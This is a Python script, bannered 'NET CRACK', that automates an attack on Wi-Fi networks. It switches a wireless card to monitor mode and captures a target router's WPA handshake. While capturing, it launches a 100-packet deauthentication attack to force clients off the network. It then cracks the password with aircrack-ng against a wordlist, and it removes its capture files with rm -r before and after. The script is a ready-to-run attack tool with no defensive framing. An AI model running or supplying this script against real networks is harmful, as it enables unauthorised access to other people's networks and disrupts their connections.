import os
import time

#-------------------------------------
os.system('rm -r password-01.cap')
os.system('rm -r password-01.csv')
os.system('rm -r password-01.kismet.csv')
os.system('rm -r password-01.kismet.netxml')
os.system('rm -r password-01.log.csv')
os.system('clear')
#-------------------------------------

print("""\033[1;31m

███╗   ██╗███████╗████████╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██╔██╗ ██║█████╗     ██║       ██║     ██████╔╝███████║██║     █████╔╝ 
██║╚██╗██║██╔══╝     ██║       ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
██║ ╚████║███████╗   ██║       ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝

""")
i = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your wifi interface : \033[1;34m')
ii = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your monitor interface : \033[1;34m')
os.system('sudo airmon-ng start ' + i)
os.system('xterm -geometry 85x20+100+350 -T "Copy Router MAC!" -hold -e airodump-ng '+ii+'')
m = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your router mac address : \033[1;34m')
os.system('xterm -geometry 85x20+100+350 -T "Copy Router CHANNEL!" -hold -e airodump-ng '+ii+'')
c = input('\033[1;37m[\033[1;32m*\033[1;37m]\033[1;33m Enter your router channel : \033[1;34m')
os.system('xterm -geometry 85x20+100+350 -T "Looking For Handshake..." -hold -e airodump-ng --bssid '+m+' -c '+c+' -w password '+ii+' & xterm -geometry 85x20+100+350 -T "Deauth Attack Started!" -hold -e aireplay-ng --deauth 100 -a '+m+' '+ii+' & xterm -geometry 85x20+100+350 -T "Displaying Handshakes!" -hold -e python loop.py')
os.system('sudo airmon-ng stop ' + ii)
os.system('clear')
print('\033[1;33m')
os.system('aircrack-ng password-01.cap -w wordlist')

#-------------------------------------
os.system('rm -r password-01.cap')
os.system('rm -r password-01.csv')
os.system('rm -r password-01.kismet.csv')
os.system('rm -r password-01.kismet.netxml')
os.system('rm -r password-01.log.csv')
#-------------------------------------
time.sleep(5)
print("""\033[1;31m

███╗   ██╗███████╗████████╗     ██████╗██████╗  █████╗  ██████╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██╔██╗ ██║█████╗     ██║       ██║     ██████╔╝███████║██║     █████╔╝ 
██║╚██╗██║██╔══╝     ██║       ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
██║ ╚████║███████╗   ██║       ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝        ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
\033[1;37m
""")
